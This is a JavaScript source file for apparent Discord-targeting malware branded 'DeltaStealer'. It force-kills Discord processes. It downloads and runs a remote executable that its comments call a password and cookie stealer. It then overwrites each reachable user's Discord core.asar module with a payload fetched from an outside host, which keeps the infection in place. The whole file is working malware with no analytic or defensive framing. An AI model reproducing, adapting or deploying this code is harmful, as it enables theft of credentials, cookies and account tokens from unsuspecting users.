// Import packages
const fs = require("fs");
const axios = require("axios");
const zip = require("adm-zip");
const FormData = require("form-data");
const { exec } = require("child_process");

// Variables
const channel_id = "<channel_id>";
const temp = process.env.temp;

// Infection
(async () => {
  // Kill Discords
  exec("tasklist", async (err, stdout, stderr) => {
    if (stdout.includes("Discord.exe")) {
      exec("taskkill /IM Discord.exe /F");
    }

    if (stdout.includes("DiscordCanary.exe")) {
      exec("taskkill /IM DiscordCanary.exe /F");
    }

    if (stdout.includes("DiscordCanary.exe")) {
      exec("taskkill /IM DiscordCanary.exe /F");
    }

    if (stdout.includes("DiscordDevelopment.exe")) {
      exec("taskkill /IM DiscordDevelopment.exe /F");
    }

    if (stdout.includes("DiscordPTB.exe")) {
      exec("taskkill /IM DiscordPTB.exe /F");
    }
  });

  // Check and Create Paths
  if (!fs.existsSync(temp + "\\win_cache_87")) {
    fs.mkdirSync(temp + "\\win_cache_87");
  }

  // Download Password & Cookie Stealer
  const response = await axios.get("https://cdn.deltastealer.xyz/main.zip", {
    responseType: "arraybuffer",
    headers: {
      "User-Agent": "DeltaStealer/6.6.6"
    }
  });

  fs.writeFileSync(temp + "\\win_cache_87\\main.zip", response.data, {
    encoding: "utf8",
    flags: "w"
  });

  const ZipFile = new zip(temp + "\\win_cache_87\\main.zip");
  await ZipFile.extractAllTo(`${temp}\\win_cache_87\\`);

  await exec(`${temp}\\win_cache_87\\main\\main.exe`);

  // Download Infection & Infect PC
  const asarFile = await axios.get(
    `https://deltastealer.xyz/download/${channel_id}?ext=asar`,
    {
      responseType: "arraybuffer",
      headers: {
        "User-Agent": "DeltaStealer/6.6.6"
      }
    }
  );

  // Try infect all users

  fs.readdirSync("c:\\Users").forEach(async (userFolder) => {
    if (
      fs.accessSync(`c:\\Users\\${userFolder}`, fs.constants.R_OK) &&
      fs.accessSync(`c:\\Users\\${userFolder}`, fs.constants.W_OK)
    ) {
      var userStated = fs.statSync(`c:\\Users\\${userFolder}`);
      if (userStated.isDirectory()) {
        if (fs.existsSync(`c:\\Users\\${userFolder}\\AppData`)) {
          if (fs.existsSync(`c:\\Users\\${userFolder}\\AppData\\Local`)) {
            fs.readdirSync(`c:\\Users\\${userFolder}\\AppData\\Local`).forEach(
              async (program) => {
                if (program.includes("cord")) {
                  var pattern = `c:\\Users\\${userFolder}\\AppData\\Local\\${program}`;
                  fs.readdirSync(pattern).forEach((appPath) => {
                    if (appPath.includes("app-")) {
                      fs.readdirSync(
                        pattern + "\\" + appPath + "\\modules"
                      ).forEach((modulePath) => {
                        if (modulePath.includes("discord_desktop_core-")) {
                          fs.writeFileSync(
                            pattern +
                              "\\" +
                              appPath +
                              "\\modules\\" +
                              modulePath +
                              "\\discord_desktop_core\\core.asar",
                            asarFile.data,
                            {
                              encoding: "utf8",
                              flags: "w"
                            }
                          );
                        }
                      });
                    }
                  });
                }
              }
            );
          }
        }
      }
    }
  });

  fs.readdirSync(process.env.localappdata).forEach((program) => {
    if (program.includes("cord")) {
      fs.readdirSync(process.env.localappdata + "\\" + program).forEach(
        (folder) => {
          if (folder.includes("app-")) {
            fs.readdirSync(
              process.env.localappdata +
                "\\" +
                program +
                "\\" +
                folder +
                "\\modules"
            ).forEach((modl) => {
              if (modl.includes("discord_desktop_core-")) {
                fs.writeFileSync(
                  process.env.localappdata +
                    "\\" +
                    program +
                    "\\" +
                    folder +
                    "\\modules\\" +
                    modl +
                    "\\discord_desktop_core\\core.asar",
                  asarFile.data,
                  {
                    encoding: "utf8",
                    flags: "w"
                  }
                );
              }
            });
          }
        }
      );
    }
  });
})();